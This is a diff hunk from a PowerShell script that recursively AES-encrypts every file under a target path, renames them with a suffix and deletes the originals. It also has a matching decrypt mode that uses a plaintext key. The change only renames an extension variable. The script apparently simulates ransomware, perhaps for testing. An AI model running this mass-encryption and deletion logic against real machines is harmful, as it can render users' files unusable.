@@ -61,21 +61,21 @@ if ($mode -eq "encrypt") {
     foreach ($file in $FilestoEncrypt)
     {
         Write-Host "Encrypting $file"
-        Protect-File $file -Algorithm AES -KeyAsPlainText $key -Suffix $EncExtension -RemoveSource
+        Protect-File $file -Algorithm AES -KeyAsPlainText $key -Suffix $Extension -RemoveSource
     }
     Write-Host "Encrypted all files." | Start-Sleep -Seconds 10
 }
 
 elseif ($mode -eq "decrypt") {
     #find files to decrypt
-    $FilestoDecrypt = get-childitem -path $TargetPath\* -Include *$EncExtension -Recurse -force | where { ! $_.PSIsContainer }
+    $FilestoDecrypt = get-childitem -path $TargetPath\* -Include *$Extension -Recurse -force | where { ! $_.PSIsContainer }
 
     #encrypt each file
 
     foreach ($file in $FilestoDecrypt)
     {
         Write-Host "Decrypting $file"
-        Unprotect-File $file -Algorithm AES -KeyAsPlainText $key -Suffix $EncExtension  -RemoveSource
+        Unprotect-File $file -Algorithm AES -KeyAsPlainText $key -Suffix $Extension  -RemoveSource
     }
 } 
 
